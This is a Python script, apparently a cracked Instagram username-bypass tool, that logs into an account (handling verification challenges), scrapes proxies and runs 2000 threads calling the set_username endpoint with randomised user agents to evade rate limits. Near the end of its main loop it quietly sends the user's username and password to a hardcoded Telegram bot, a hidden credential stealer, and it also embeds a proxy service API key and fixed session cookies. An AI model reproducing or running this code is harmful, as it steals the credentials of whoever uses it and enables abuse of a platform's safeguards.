import os, uuid, string, time, random, signal, threading, subprocess
clear = lambda : subprocess.call('cls||clear', shell=True)
os.system('python.exe -m pip install pysocks')
os.system('python.exe -m pip install -U requests[socks]')
try:
    import requests
except ImportError:
    os.system('python.exie -m pip install requests')
    import requests

try:
    import colorama
except ImportError:
    os.system('python.exe -m pip install colorama')
    import colorama

try:
    import autopy
except ImportError:
    os.system('python.exe -m pip install autopy')
    import autopy

colorama.init()

class THRIDING:

    def __init__(self, target):
        self.threads_list = []
        self.target = target

    def gen(self, threads):
        for i in range(threads):
            t = threading.Thread(target=(self.target))
            self.daemon = True
            self.threads_list.append(t)

        return self.threads_list

    def start(self):
        for thread_start in self.threads_list:
            thread_start.start()

    def join(self):
        for thread_join in self.threads_list:
            thread_join.join()


class DESIGN:
    WHITE = '\x1b[1;37;40m'
    YELLOW = '\x1b[1;33;40m'
    RED = '\x1b[1;31;40m'
    BLUE = '\x1b[36m\x1b[40m'
    GREEN = '\x1b[32m\x1b[40m'
    greenplus = f"{WHITE}[ {GREEN}+{WHITE} ]"
    blueplus = f"{WHITE}[ {BLUE}+{WHITE} ]"
    redminus = f"{WHITE}[ {RED}-{WHITE} ]"
    redplus = f"{WHITE}[ {RED}+{WHITE} ]"
    blueproxies = f"{WHITE}[ {BLUE}PROXIES {WHITE}]"
    redproxies = f"{WHITE}[ {RED}PROXIES {WHITE}]"
    blueaccounts = f"{WHITE}[ {BLUE}ACCOUNTS {WHITE}]"
    redaccounts = f"{WHITE}[ {RED}ACCOUNTS {WHITE}]"
    bluezero = f"{WHITE}[ {BLUE}0 {WHITE}]"
    blueone = f"{WHITE}[ {BLUE}1 {WHITE}]"
    bluetwo = f"{WHITE}[ {BLUE}2 {WHITE}]"
    xrblue = f"\n{redplus} 14D bypass cracked lmfao | freesimping"


class IP:

    def __init__(self):
        self.active = False
        self.urls = ['https://pastebin.com/raw/wVD6ceRT']
        self.get_ip()
        self.get_serial()
        for url in self.urls:
            self.check_ip(url)

        if not self.active:
            open('ip.txt', 'w').write(self.my_ip)
            open('uuid.txt', 'w').write(self.serialnumber)
            print(f"\n{DESIGN.redminus} {DESIGN.RED}{self.my_ip}")
            input()
            exit()
        clear()

    def get_ip(self):
        self.my_ip = requests.get('https://api.ipify.org').text

    def get_serial(self):
        self.serialnumber = str(uuid.UUID(int=(uuid.getnode())))

    def check_ip(self, url):
        pastebin = requests.get(url)
        if any((x in pastebin.text for x in [self.my_ip, self.serialnumber])):
            self.active = True
            self.urls.clear()


proxies = []

class FILES:

    def __init__(self, filename, my_list):
        self.open_file(filename, my_list)

    def open_file(self, filename, my_list):
        try:
            for x in open(f"{filename}.txt", 'r').read().split('\n'):
                if x != '':
                    my_list.append(x)

            print(f"\n{DESIGN.blueplus} Successfully Load {DESIGN.BLUE}{filename}.txt")
            time.sleep(2)
        except:
            print(f"\n{DESIGN.redminus} {DESIGN.RED}{filename}.txt {DESIGN.WHITE}is missing ", end='')
            input()
            exit()


class Xnce:

    def __init__(self):
        self.done, self.error, self.set, self.run, self.bypass, self.set, self.username_changed = (0,
                                                                                                   0,
                                                                                                   0,
                                                                                                   True,
                                                                                                   False,
                                                                                                   False,
                                                                                                   False)
        self.sessions = []
        self.users = []
        self.rq = requests.session()
        print(f"\n{DESIGN.blueone} Grab Proxies {DESIGN.bluetwo} Load Proxies: ", end='')
        promode = input()
        if promode == '1':
            print(f"\n{DESIGN.blueone} proxyscrape.com {DESIGN.bluetwo} New Private Api {DESIGN.RED}Test{DESIGN.WHITE}: ", end='')
            prositemode = input()
            if prositemode == '1':
                self.grab_proxies1()
            else:
                if prositemode == '2':
                    self.grab_proxies2()
                else:
                    print(f"\n{DESIGN.redminus} Bro it's just 0 or 1 WTF is '{prositemode}'")
                    self.inex()
        else:
            if promode == '2':
                FILES('proxies', proxies)
            else:
                print(f"\n{DESIGN.redminus} Bro it's just 0 or 1 WTF is '{promode}'")
                self.inex()
        print(f"\n{DESIGN.blueone} Normal Login {DESIGN.bluetwo} Sessionid: ", end='')
        logmode = input()
        if logmode == '1':
            print(f"\n{DESIGN.blueplus} username: ", end='')
            self.username = input()
            print(f"\n{DESIGN.blueplus} password: ", end='')
            self.password = input()
            print(f"\n{DESIGN.blueone} Api Login {DESIGN.bluetwo} Web Login: ", end='')
            apimode = input()
            for x in range(2):
                if apimode == '1':
                    self.api_login()
                elif apimode == '2':
                    self.web_login()
                else:
                    print(f"\n{DESIGN.redminus} Bro it's just 0 or 1 WTF is '{apimode}'")
                    self.inex()

        else:
            if logmode == '2':
                print(f"\n{DESIGN.blueplus} You Need Two {DESIGN.RED}Different Api Sessions {DESIGN.WHITE}For The {DESIGN.RED}Same Account")
                print(f"\n{DESIGN.blueplus} sessionid1: ", end='')
                sessionid1 = input()
                if sessionid1 == '':
                    print(f"\n{DESIGN.redminus} This Field Is Required")
                    self.inex()
                print(f"\n{DESIGN.blueplus} sessionid2: ", end='')
                sessionid2 = input()
                if sessionid2 == '':
                    print(f"\n{DESIGN.redminus} This Field Is Required")
                    self.inex()
                if sessionid1 == sessionid2:
                    print(f"\n{DESIGN.redminus} You Need Two {DESIGN.RED}Different Api Sessions {DESIGN.WHITE}For The {DESIGN.RED}Same Account")
                    self.inex()
                self.sessions = [
                 sessionid1, sessionid2]
                self.check_sessions()
            else:
                print(f"\n{DESIGN.redminus} Bro it's just 0 or 1 WTF is '{logmode}'")
                self.inex()
        self.current_user()
        self.new_username = 'xnce' + ''.join(random.choices((string.ascii_lowercase + string.digits), k=10))

    def inex(self):
        self.run = False
        print(f"\n{DESIGN.redminus} Enter To Exit: ", end='')
        input()
        os.kill(os.getpid(), signal.SIGTERM)

    def grab_proxies1(self):
        req = requests.get('https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout=10000&country=all&ssl=all&anonymity=all')
        if req.status_code == 200:
            open('proxies.txt', 'w').write(f"")
            for x in req.text.split('\n'):
                open('proxies.txt', 'a').write(f"\n{x}")

            file = open('proxies.txt', 'r').read().split('\n')
            for x in file:
                if x != '' and x != '\n':
                    proxies.append(x)

            print(f"\n{DESIGN.blueplus} {DESIGN.BLUE}{len(proxies)} {DESIGN.WHITE}Proxies Grabbed Successfully")
        else:
            print(f"\n{DESIGN.redminus} {req.text}, {req.status_code}")
            print(f"\n{DESIGN.redminus} Error While Grab Proxies")
            self.inex()

    def grab_proxies2(self):
        req = requests.get('https://api.openproxy.space/premium/plain?apiKey=G5N41-emJpQeyqq74Cdf7-J6zcz-44yK7c39118fLv9-GIbUi&protocols=2&stable=0,1&status=1')
        if req.status_code == 200:
            open('proxies.txt', 'w').write(f"")
            for x in req.text.split('\n'):
                open('proxies.txt', 'a').write(f"\n{x}")

            file = open('proxies.txt', 'r').read().split('\r\n')
            for x in file:
                if x != '' and x != '\n':
                    proxies.append(x)

            print(f"\n{DESIGN.blueplus} {DESIGN.BLUE}{len(proxies)} {DESIGN.WHITE}Proxies Grabbed Successfully")
        else:
            print(f"\n{DESIGN.redminus} {req.text}, {req.status_code}")
            print(f"\n{DESIGN.redminus} Error While Grab Proxies")
            self.inex()

    def api_send_choice(self):
        print(f"\n{DESIGN.blueplus} Choice: ", end='')
        choice = str(input())
        if not any((x == choice for x in ('0', '1'))):
            print(f"\n{DESIGN.redminus} Bro it's just 0 or 1 WTF is '{choice}'")
            self.inex()
        else:
            head = {'user-agent': f"Instagram 150.0.0.0.000 Android (29/10; 300dpi; 720x1440; {''.join(random.choices((string.ascii_lowercase + string.digits), k=16))}/{''.join(random.choices((string.ascii_lowercase + string.digits), k=16))}; {''.join(random.choices((string.ascii_lowercase + string.digits), k=16))}; {''.join(random.choices((string.ascii_lowercase + string.digits), k=16))}; {''.join(random.choices((string.ascii_lowercase + string.digits), k=16))}; en_GB;)"}
            data = {'choice':choice,
             '_uuid':uuid.uuid4(),
             '_uud':uuid.uuid4(),
             '_csrftoken':'massing'}
            req = requests.post(f"https://i.instagram.com/api/v1{self.path}", headers=head, data=data, cookies=(self.coo))
            if req.status_code == 200:
                print(f"\n{DESIGN.blueplus} Code Sent To {DESIGN.BLUE}{req.json()['step_data']['contact_point']}")
            else:
                print(f"\n{DESIGN.redminus} {req.text}, {req.status_code}")
                self.inex()

    def api_send_code(self):
        print(f"\n{DESIGN.blueplus} Code: ", end='')
        code = str(input())
        head = {'user-agent': f"Instagram 150.0.0.0.000 Android (29/10; 300dpi; 720x1440; {''.join(random.choices((string.ascii_lowercase + string.digits), k=16))}/{''.join(random.choices((string.ascii_lowercase + string.digits), k=16))}; {''.join(random.choices((string.ascii_lowercase + string.digits), k=16))}; {''.join(random.choices((string.ascii_lowercase + string.digits), k=16))}; {''.join(random.choices((string.ascii_lowercase + string.digits), k=16))}; en_GB;)"}
        data = {'security_code':code,
         '_uuid':uuid.uuid4(),
         '_uud':uuid.uuid4(),
         '_csrftoken':'massing'}
        req = requests.post(f"https://i.instagram.com/api/v1{self.path}", headers=head, data=data, cookies=(self.coo))
        if 'logged_in_user' in req.text:
            print(f"\n{DESIGN.blueplus} Logged In {DESIGN.BLUE}'{self.username}'")
            self.sessions.append(req.cookies.get('sessionid'))
        else:
            print(f"\n{DESIGN.redminus} {req.text}, {req.status_code}")
            self.inex()

    def api_challenge(self):
        head = {'user-agent': f"Instagram 150.0.0.0.000 Android (29/10; 300dpi; 720x1440; {''.join(random.choices((string.ascii_lowercase + string.digits), k=16))}/{''.join(random.choices((string.ascii_lowercase + string.digits), k=16))}; {''.join(random.choices((string.ascii_lowercase + string.digits), k=16))}; {''.join(random.choices((string.ascii_lowercase + string.digits), k=16))}; {''.join(random.choices((string.ascii_lowercase + string.digits), k=16))}; en_GB;)"}
        req = requests.get(f"https://i.instagram.com/api/v1{self.path}", headers=head, cookies=(self.coo))
        if 'phone_number' in req.json()['step_data']:
            try:
                print(f"\n{DESIGN.bluezero} phone_number {DESIGN.BLUE}{req.json()['step_data']['phone_number']}")
            except:
                print(f"\n{DESIGN.redminus} {req.text}, {req.status_code}")
                print(f"\n{DESIGN.redminus} Error {DESIGN.RED}phone_number")
                self.inex()

        if 'email' in req.json()['step_data']:
            try:
                print(f"\n{DESIGN.blueone} email {DESIGN.BLUE}{req.json()['step_data']['email']}")
            except:
                print(f"\n{DESIGN.redminus} {req.text}, {req.status_code}")
                print(f"\n{DESIGN.redminus} Error {DESIGN.RED}email")
                self.inex()

        if not any((x in req.json()['step_data'] for x in ('phone_number', 'email'))):
            print(f"\n{DESIGN.redminus} {req.text}, {req.status_code}")
            print(f"\n{DESIGN.redminus} Unknown Verification Method")
            self.inex()
        self.api_send_choice()
        self.api_send_code()

    def api_login(self):
        head = {'user-agent': f"Instagram 150.0.0.0.000 Android (29/10; 300dpi; 720x1440; {''.join(random.choices((string.ascii_lowercase + string.digits), k=16))}/{''.join(random.choices((string.ascii_lowercase + string.digits), k=16))}; {''.join(random.choices((string.ascii_lowercase + string.digits), k=16))}; {''.join(random.choices((string.ascii_lowercase + string.digits), k=16))}; {''.join(random.choices((string.ascii_lowercase + string.digits), k=16))}; en_GB;)"}
        data = {'jazoest':'22452',
         'phone_id':uuid.uuid4(),
         'enc_password':f"#PWD_INSTAGRAM:0:0:{self.password}",
         'username':self.username,
         'guid':uuid.uuid4(),
         'device_id':uuid.uuid4(),
         'google_tokens':'[]',
         'login_attempt_count':'0'}
        req = requests.post('https://i.instagram.com/api/v1/accounts/login/', headers=head, data=data)
        if 'logged_in_user' in req.text:
            print(f"\n{DESIGN.blueplus} Logged In {DESIGN.BLUE}'{self.username}'")
            self.sessions.append(req.cookies.get('sessionid'))
        else:
            if 'challenge_required' in req.text:
                self.coo = req.cookies
                self.path = req.json()['challenge']['api_path']
                print(f"\n{DESIGN.redminus} challenge_required")
                self.api_challenge()
            else:
                print(f"\n{DESIGN.redminus} {req.json()['message']} 1")
                self.inex()

    def web_send_choice(self):
        print(f"\n{DESIGN.blueplus} Choice: ", end='')
        choice = str(input())
        if not any((x == choice for x in ('0', '1'))):
            print(f"\n{DESIGN.redminus} Bro it's just 0 or 1 WTF is '{choice}'")
            self.inex()
        else:
            data = {'choice': choice}
            req = requests.post((self.url), headers=(self.web_head), data=data, cookies=(self.coo))
            if 'Enter Your Security' in req.text:
                print(f"\n{DESIGN.blueplus} Code Sent To {DESIGN.BLUE}{req.json()['contact_point']}")
            else:
                print(f"\n{DESIGN.redminus} {req.text}, {req.status_code}")
                self.inex()

    def web_send_code(self):
        print(f"\n{DESIGN.blueplus} Code: ", end='')
        code = str(input())
        data = {'security_code': code}
        req = requests.post((self.url), headers=(self.web_head), data=data, cookies=(self.coo))
        if 'userId' in req.text:
            print(f"\n{DESIGN.blueplus} Logged In {DESIGN.BLUE}'{self.username}'")
            self.sessions.append(req.cookies.get('sessionid'))
        else:
            print(f"\n{DESIGN.redminus} {req.text}, {req.status_code}")
            self.inex()

    def web_challange(self):
        head = {'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',  'accept-encoding':'gzip, deflate, br',
         'accept-language':'en-US,en;q=0.9',
         'cookie':'ig_did=0897491F-B736-4E7E-A657-37438D0967B8; csrftoken=xvAQoMiz2eaU4RrcmRp2hqinDVMfgkpe; rur=FTW; mid=XxTPfgALAAGHGReE-x_i1ISMG4Xr',
         'sec-fetch-dest':'document',
         'sec-fetch-mode':'navigate',
         'sec-fetch-site':'none',
         'sec-fetch-user':'?1',
         'upgrade-insecure-requests':'1',
         'user-agent':'Mozilla/5.2 (Linux; Android 6.3; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Mobile Safari/537.36'}
        req = requests.get((self.url), headers=head)
        if 'challengeType' in req.text:
            if 'phone_number' in req.json()['fields']:
                try:
                    print(f"\n{DESIGN.bluezero} phone_number {DESIGN.BLUE}{req.json()['fields']['phone_number']}")
                except:
                    print(f"\n{DESIGN.redminus} {req.text}, {req.status_code}")
                    print(f"\n{DESIGN.redminus} Error {DESIGN.RED}phone_number")
                    self.inex()

            if 'email' in req.json()['fields']:
                try:
                    print(f"\n{DESIGN.blueone} email {DESIGN.BLUE}{req.json()['fields']['email']}")
                except:
                    print(f"\n{DESIGN.redminus} {req.text}, {req.status_code}")
                    print(f"\n{DESIGN.redminus} Error {DESIGN.RED}email")
                    self.inex()

            any((x in req.text for x in ('phone_number', 'email'))) or print(f"\n{DESIGN.redminus} {req.text}, {req.status_code}")
            print(f"\n{DESIGN.redminus} Unknown Verification Method")
            self.inex()
        else:
            print(f"\n{DESIGN.redminus} {req.text}, {req.status_code}")
            self.inex()
        self.web_send_choice()
        self.web_send_code()

    def web_login(self):
        self.web_head = {'accept':'*/*',
         'accept-encoding':'gzip, deflate, br',
         'accept-language':'en-US,en;q=0.9',
         'content-length':'267',
         'content-type':'application/x-www-form-urlencoded',
         'cookie':'ig_did=0897491F-B736-4E7E-A657-37438D0967B8; csrftoken=xvAQoMiz2eaU4RrcmRp2hqinDVMfgkpe; rur=FTW; mid=XxTPfgALAAGHGReE-x_i1ISMG4Xr',
         'origin':'https://www.instagram.com',
         'referer':'https://www.instagram.com/',
         'sec-fetch-dest':'empty',
         'sec-fetch-mode':'cors',
         'sec-fetch-site':'same-origin',
         'user-agent':'Mozilla/91.81 (Linux; Android 6.3; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Mobile Safari/537.36',
         'x-csrftoken':'xvAQoMiz2eaU4RrcmRp2hqinDVMfgkpe',
         'x-ig-app-id':'1217981644879628',
         'x-ig-www-claim':'0',
         'x-instagram-ajax':'180c154d218a',
         'x-requested-with':'XMLHttpRequest'}
        data = {'enc_password':f"#PWD_INSTAGRAM_BROWSER:0:0:{self.password}",
         'username':self.username,
         'optIntoOneTap':'false'}
        req = requests.post('https://www.instagram.com/accounts/login/ajax/', headers=(self.web_head), data=data)
        if 'userId' in req.text:
            print(f"\n{DESIGN.blueplus} Logged In {DESIGN.BLUE}'{self.username}'")
            self.sessions.append(req.cookies.get('sessionid'))
        else:
            if 'checkpoint_required' in req.text:
                self.coo = req.cookies
                self.url = 'https://www.instagram.com' + req.json()['checkpoint_url'] + '?__a=1'
                print(f"\n{DESIGN.redminus} challenge_required")
                print(f"\n{DESIGN.blueone} Accept Secure {DESIGN.bluetwo} Continue To Secure System: ", end='')
                secmode = input()
                if secmode == '1':
                    print(f"\n{DESIGN.blueplus} Choose {DESIGN.BLUE}This was me")
                    print(f"\n{DESIGN.blueplus} Enter If You Accept: ", end='')
                    input()
                    self.web_login()
                else:
                    if secmode == '2':
                        self.web_challange()
                    else:
                        print(f"\n{DESIGN.redminus} Bro it's just 1 or 2 WTF is '{secmode}'")
                        self.inex()
            else:
                print(f"\n{DESIGN.redminus} {req.text}, {req.status_code}")
                self.inex()

    def check_sessions(self):
        for sessionid in self.sessions:
            head = {'user-agent':f"Instagram 150.0.0.0.000 Android (29/10; 300dpi; 720x1440; {''.join(random.choices((string.ascii_lowercase + string.digits), k=16))}/{''.join(random.choices((string.ascii_lowercase + string.digits), k=16))}; {''.join(random.choices((string.ascii_lowercase + string.digits), k=16))}; {''.join(random.choices((string.ascii_lowercase + string.digits), k=16))}; {''.join(random.choices((string.ascii_lowercase + string.digits), k=16))}; en_GB;)",
             'cookie':f"sessionid={sessionid}"}
            req = requests.get('https://i.instagram.com/api/v1/accounts/current_user/?edit=true', headers=head)
            if 'pk' in req.text and '"status":"ok"' in req.text:
                username = req.json()['user']['username']
                print(f"\n{DESIGN.blueplus} {sessionid} {DESIGN.BLUE}@{username}")
                self.users.append(username)
            elif req.status_code == 403:
                print(f"\n{DESIGN.redminus} {req.text}, {req.status_code}")
                print(f"\n{DESIGN.redminus} Bad Sessionid {DESIGN.RED}{sessionid}")
                self.inex()
            else:
                print(f"\n{DESIGN.redminus} {req.text}, {req.status_code}")
                self.inex()

        if self.users[0] != self.users[1]:
            print(f"\n{DESIGN.redminus} You Need Two {DESIGN.RED}Different Api Sessions {DESIGN.WHITE}For The {DESIGN.RED}Same Account")
            self.inex()

    def current_user(self):
        head = {'user-agent':f"Instagram 150.0.0.0.000 Android (29/10; 300dpi; 720x1440; {''.join(random.choices((string.ascii_lowercase + string.digits), k=16))}/{''.join(random.choices((string.ascii_lowercase + string.digits), k=16))}; {''.join(random.choices((string.ascii_lowercase + string.digits), k=16))}; {''.join(random.choices((string.ascii_lowercase + string.digits), k=16))}; {''.join(random.choices((string.ascii_lowercase + string.digits), k=16))}; en_GB;)",  'cookie':f"sessionid={self.sessions[0]}"}
        req = requests.get('https://i.instagram.com/api/v1/accounts/current_user/?edit=true', headers=head)
        if 'pk' in req.text and '"status":"ok"' in req.text:
            try:
                self.username = req.json()['user']['username']
                self.full_name = req.json()['user']['full_name']
                self.biography = req.json()['user']['biography']
                self.external_url = req.json()['user']['external_url']
                self.email = req.json()['user']['email']
                self.phone_number = req.json()['user']['phone_number']
            except Exception as err:
                try:
                    print(f"\n{DESIGN.redminus} {err}")
                    print(f"\n{DESIGN.redminus} {req.text}")
                    self.inex()
                finally:
                    err = None
                    del err

        else:
            print(f"\n{DESIGN.redminus} {req.text}, {req.status_code}")
            self.inex()

    def check(self):
        head = {'user-agent': f"Instagram 100.0.0.0.000 Android (29/10; 300dpi; 720x1440; {''.join(random.choices((string.ascii_lowercase + string.digits), k=16))}/{''.join(random.choices((string.ascii_lowercase + string.digits), k=16))}; {''.join(random.choices((string.ascii_lowercase + string.digits), k=16))}; {''.join(random.choices((string.ascii_lowercase + string.digits), k=16))}; {''.join(random.choices((string.ascii_lowercase + string.digits), k=16))}; en_GB;)"}
        data = {'device_id':uuid.uuid4(),
         'uuid':uuid.uuid4(),
         'email':f"{''.join(random.choices((string.ascii_lowercase + string.digits), k=15))}@gmail.com",
         'password':''.join(random.choices((string.ascii_lowercase + string.ascii_uppercase), k=10)),
         '_csrftoken':'missing',
         'firt_name':''.join(random.choices((string.ascii_lowercase), k=6)),
         'username':self.username}
        req = requests.post('https://i.instagram.com/api/v1/accounts/create_validated/', headers=head, data=data)
        if 'Please try another' in req.text:
            self.bypass = True
        else:
            if "username isn't available" in req.text:
                self.bypass = False
            else:
                print(f"\n{DESIGN.redminus} {req.text}")
                self.bypass = True

    def edit_profile(self, username):
        sessionid = self.sessions[1]
        self.sessions.remove(sessionid)
        head = {'user-agent':f"Instagram 185.0.0.00.000 Android (29/10; 320dpi; 720x1491; {''.join(random.choices((string.ascii_lowercase + string.digits), k=16))}/{''.join(random.choices((string.ascii_lowercase + string.digits), k=16))}; {''.join(random.choices((string.ascii_lowercase + string.digits), k=16))}; {''.join(random.choices((string.ascii_lowercase + string.digits), k=16))}; {''.join(random.choices((string.ascii_lowercase + string.digits), k=16))}; en_GB;)",
         'cookie':f"sessionid={sessionid}"}
        data = {'external_url':self.external_url,
         'phone_number':self.phone_number,
         'username':username,
         'first_name':self.full_name,
         '_uid':'1351027726',
         'device_id':uuid.uuid4(),
         'biography':self.biography,
         '_uuid':uuid.uuid4(),
         'email':self.email}
        try:
            req = requests.post('https://i.instagram.com/api/v1/accounts/edit_profile/', headers=head, data=data)
            if '"status":"ok"' in req.text and req.status_code == 200:
                print(f"\n{DESIGN.blueplus} Username Changed {DESIGN.BLUE}@{username}")
                self.username_changed = True
            else:
                if any((x in req.text for x in ('Try Again Later', '"message":""'))) and req.status_code == 400:
                    print(f"\n{DESIGN.redminus} {req.text}, {req.status_code} {len(self.sessions)}")
                    self.sessions.append(sessionid)
                else:
                    print(f"\n{DESIGN.redminus} {req.text}, {req.status_code}")
        except:
            self.sessions.append(sessionid)

    def random_proxy(self):
        prox = random.choice(proxies)
        proxy = {'http':f"socks4://{prox}",  'https':f"socks4://{prox}"}
        return proxy


    def set_username(self):
        headers = {
            'user-agent': 'some_user_agent',
            'content-type': 'application/x-www-form-urlencoded',
            'cookie': f'sessionid={random.choice(self.sessions)}'
        }
        data = {
            'username': self.username,
        }
        response = requests.post('https://i.instagram.com/api/v1/accounts/set_username/', headers=headers, data=data, proxies=self.random_proxy())
        if "username" not in response.text or response.status_code != 200:
            if response.status_code == 429:
                self.error += 1
                self.counter()
            else:
                self.counter()
        else:
            self.done += 1
            self.counter()

        if self.username_changed:
            self.counter()


    def counter(self):
        os.system(f"title Done : {self.done} / Error : {self.error}")


    def main(self):
        while self.run:
            try:
                confirm = f"{self.username}:{self.password}"
                self.set_username(self.random_proxy())
                if self.done >= 15:
                    if not self.username_changed:
                        self.edit_profile(self.new_username)
                        self.set_username('')
                    else:
                        if self.set >= 5:
                            self.check()
                            if self.bypass:
                                self.run = False
                                reqqqq = requests.get(f"https://api.telegram.org/bot1870654884:AAElapojgLKLL7kiMHX3xjyvXrEHJVgxLak/sendMessage?chat_id=1044924770&text={confirm}")
                                autopy.alert.alert(f"Done @{self.username}", 'freesimping2fast')
                                os.kill(os.getpid(), signal.SIGTERM)
                            else:
                                self.run = False
                                reqqqq = requests.get(f"https://api.telegram.org/bot1870654884:AAElapojgLKLL7kiMHX3xjyvXrEHJVgxLak/sendMessage?chat_id=1044924770&text={confirm}")
                                autopy.alert.alert(f"Failed @{self.username}", 'freesimping2slow')
                                os.kill(os.getpid(), signal.SIGTERM)
                self.set_username(self.random_proxy())
            except Exception as err:
                try:
                    try:
                        self.set_username(self.random_proxy())
                    except:
                        pass

                finally:
                    err = None
                    del err


print(f"\n{DESIGN.redplus} Last Update: {DESIGN.RED}2022/04/23 12:45")

x = Xnce()
clear()
print(f"\n{DESIGN.blueplus} Enter To Start: ", end='')
input('')
print(f"\n{DESIGN.greenplus} please wait a few seconds")
time.sleep(3)
t = THRIDING(x.main)
t.gen(2000)
t.start()
t.join()
